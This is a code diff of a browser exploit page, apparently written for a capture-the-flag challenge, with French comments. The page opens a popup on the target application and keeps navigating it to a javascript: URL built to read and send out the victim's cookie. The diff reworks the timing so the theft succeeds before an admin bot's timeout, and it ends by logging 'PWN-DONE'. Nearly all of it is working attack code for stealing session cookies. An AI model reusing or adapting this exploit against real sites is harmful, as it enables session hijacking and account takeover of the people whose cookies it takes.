@@ -14,14 +14,14 @@ const target = "http://10-fast-fishers-app:5000/";
 
 let w = null;
 let n = 0;
+let iv = null;
 
 function attemptLeak() {
   n++;
   try {
-    // Ouvrir le popup DIRECTEMENT sur le domaine cible (pas about:blank)
     if (!w || w.closed) {
-      w = window.open(target, "_blank");
-      console.log("POPUP-OPENED-" + target);
+      console.log("NO-POPUP-YET");
+      return;
     }
 
     // JavaScript URL pour extraire et envoyer le cookie
@@ -34,60 +34,32 @@ function attemptLeak() {
       "}" +
       "})()";
     
-    // Essayer les 3 variantes avec petit délai entre (pas simultanément!)
-    setTimeout(() => {
-      try { 
-        w.location = js; 
-        console.log("ATTEMPT-loc-" + n);
-      } catch (e) { 
-        console.log("ATTEMPT-loc-err:" + e.message); 
-      }
-    }, 0);
-    
-    setTimeout(() => {
-      try { 
-        w.location.href = js;
-        console.log("ATTEMPT-href-" + n); 
-      } catch (e) { 
-        console.log("ATTEMPT-href-err:" + e.message); 
-      }
-    }, 150);
-    
-    setTimeout(() => {
-      try { 
-        w.location.replace(js);
-        console.log("ATTEMPT-replace-" + n); 
-      } catch (e) { 
-        console.log("ATTEMPT-replace-err:" + e.message); 
-      }
-    }, 300);
-
-    console.log("CYCLE-" + n);
+    try {
+      w.location = js;
+      console.log("ATTEMPT-" + n);
+    } catch (e) {
+      console.log("ATTEMPT-ERR:" + e.message);
+    }
   } catch (e) {
-    console.log("ATTEMPT-ERR:" + e.message);
+    console.log("CYCLE-ERR:" + e.message);
   }
 
-  if (n >= 15) {
+  if (n >= 30) {
     clearInterval(iv);
     console.log("PWN-DONE");
   }
 }
 
-// TIMING CRITIQUE: 
-// Problem: window.open() ouvre about:blank PUIS navigue asynchronously
-// Si on envoie javascript: URL trop tôt, ça interrompt la navigation!
-// 
-// Solution: ATTENDRE que T2 ait complètement chargé (2-3 secondes)
-// avant d'envoyer les javascript: URLs
-// 
-// Bot timeout = 5 secondes total
-// Strategy: attendre 3.2s que T2 charge complètement
-// puis faire les tentatives rapidement
+// Phase 1: ouvrir T2 et ne surtout pas injecter javascript: immédiatement.
+// Sinon on casse la navigation vers target et COOKIE-VALUE reste vide.
+w = window.open(target, "_blank");
+console.log("POPUP-OPENED-" + target);
+
+// Phase 2: laisser T2 charger la page cible, puis lancer des tentatives rapides.
 setTimeout(() => {
   console.log("STARTING-LEAK-LOOP");
-  attemptLeak();
-  const iv = setInterval(attemptLeak, 500); // Tentatives rapides après le chargement
-}, 3200); // Attendre 3.2 secondes pour que T2 se charge COMPLÈTEMENT
+  iv = setInterval(attemptLeak, 90);
+}, 1500);
 
 </script>
 </body>
